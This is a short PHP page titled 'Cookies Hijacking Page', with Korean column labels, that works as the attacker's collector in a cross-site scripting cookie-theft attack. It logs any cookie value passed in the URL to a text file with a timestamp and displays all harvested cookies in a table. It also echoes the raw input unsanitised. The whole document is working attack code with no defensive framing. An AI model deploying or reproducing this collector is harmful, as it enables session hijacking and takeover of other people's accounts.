<html>
<body>
<h1>Cookies Hijacking Page</h1>
<?php
$cookie=$_GET[cookie];
$now = date("Y-m-d-h-i-s");
echo "{$now}<br>";
if(strlen($cookie) >2) {
	$save_file=fopen("getcookies/cookies.txt", "a");
	fwrite($save_file, "{$now}\n");
	fwrite($save_file, "{$cookie}\n");
	fclose($save_file);
}
?>
<h3>Cookie value  of this session : </h3>
<p><?php echo $cookie; ?></p>
<br>
	<?php
	$fp = fopen("getcookies/cookies.txt", "r");
	echo "<table border=\"1\">";
	echo "<th><b>접속 시간</b></th>";
	echo "<th><b>쿠키 값</b></th>";
	while(!feof($fp)) {
		$ti = fgets($fp, 30);
		if(strlen($ti)>2) {
			echo "<tr><td>{$ti}</td>";
		}
		$coo = fgets($fp, 100);
		if(strlen($coo)>2) {
			echo "<td>{$coo}</td></tr>";
		}
	}
	echo "</table>";
	?>
</body>
</html>